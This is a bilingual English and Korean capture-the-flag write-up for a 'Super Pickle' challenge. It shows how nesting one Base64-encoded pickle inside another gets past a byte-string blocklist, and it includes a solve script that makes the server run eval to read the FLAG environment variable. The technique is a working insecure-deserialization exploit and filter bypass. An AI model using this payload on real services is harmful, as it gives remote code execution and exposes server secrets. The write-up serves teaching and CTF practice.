Super Pickle

AUTHOR Abdullah Hamdan

I just made a Super Pickle. What is so special about Pickle that people keep telling me to avoid it?

Super Pickle을 하나 만들었다. Pickle에 뭐가 있길래 다들 쓰지 말라고 하는 걸까?

FLAG FORMATInIt{...}

Write Up

Starting from the Challenge

The service accepts a Base64-encoded pickle and displays the restored object. When a normal object was submitted, its contents appeared under Decoded value. Because pickle can invoke functions while reconstructing an object, I checked whether it was possible to execute arbitrary code on the server.

1. Inspecting what the filter sees

The function and arguments returned by an object's __reduce__ method are executed during deserialization. However, the server's filter blocked pickles containing eval, builtins, posix, or subprocess.

Comparing the responses showed that the server searched the raw pickle bytes for banned strings before deserialization.

Q: How can the blocked code stay out of those raw bytes and still reach pickle.loads?

2. Wrapping one pickle inside another

I placed the object to execute in an inner pickle and Base64-encoded it. The outer pickle restores the inner data with base64.b64decode, then reads it again with pickle.loads. The banned strings are not visible in the outer bytes, but the inner pickle runs after the filter has finished.

I first set the inner value to nested-ok, and the server returned the same string. I then read /app/app.py and confirmed that the Flag was stored in the FLAG environment variable.

3. Reading the Environment Variable

# solve.py — written for this write-up
class ReadFlag:
    def __reduce__(self):
        expression = "__import__('os').environ['FLAG']"
        return (eval, (expression,))

inner = pickle.dumps(ReadFlag())
inner_b64 = base64.b64encode(inner)

outer = (
    b"cpickle\nloads\n"
    b"cbase64\nb64decode\n"
    b"S'" + inner_b64 + b"'\n"
    b"\x85R\x85R."
)

payload = base64.b64encode(outer).decode()
print(payload)

inner contains the action that reads the environment variable, and outer decodes and deserializes it again. Submitting this value to the service displayed the Flag under Decoded value.

문제에서 출발하기

서비스는 Base64로 인코딩된 pickle을 입력받아 복원한 객체를 보여 준다. 정상 객체를 넣으면 Decoded value에 내용이 출력됐다. pickle은 객체를 복원하는 과정에서 함수를 호출할 수 있으므로, 서버에서 임의 코드를 실행할 수 있는지 확인했다.

1. 필터가 보는 데이터 확인하기

객체의 __reduce__가 반환한 함수와 인자는 역직렬화할 때 실행된다. 그러나 eval, builtins, posix, subprocess가 들어간 pickle은 서버의 필터에 차단됐다.

응답을 비교해 보니 서버는 역직렬화 전에 pickle의 원시 바이트에서 금지 문자열을 찾고 있었다.

Q: 차단된 코드를 원시 바이트에서 감추면서 어떻게 pickle.loads까지 전달할까?

2. pickle을 한 겹 더 감싸기

안쪽 pickle에는 실행할 객체를 넣고 Base64로 인코딩했다. 바깥 pickle은 base64.b64decode로 안쪽 데이터를 복원한 뒤 pickle.loads로 다시 읽는다. 바깥 바이트에는 금지 문자열이 보이지 않지만, 필터 검사가 끝난 뒤 안쪽 pickle이 실행된다.

먼저 안쪽 값을 nested-ok로 두었을 때 서버가 같은 문자열을 반환했다. 이어 /app/app.py를 읽어 Flag가 환경 변수 FLAG에 저장된 것을 확인했다.

3. 환경 변수 읽기

# solve.py — written for this write-up
class ReadFlag:
    def __reduce__(self):
        expression = "__import__('os').environ['FLAG']"
        return (eval, (expression,))

inner = pickle.dumps(ReadFlag())
inner_b64 = base64.b64encode(inner)

outer = (
    b"cpickle\nloads\n"
    b"cbase64\nb64decode\n"
    b"S'" + inner_b64 + b"'\n"
    b"\x85R\x85R."
)

payload = base64.b64encode(outer).decode()
print(payload)

inner에는 환경 변수를 읽는 동작이 들어 있고, outer는 이를 디코딩해 다시 역직렬화한다. 출력된 문자열을 페이지의 입력란에 넣자 Decoded value에 플래그가 나타났다.
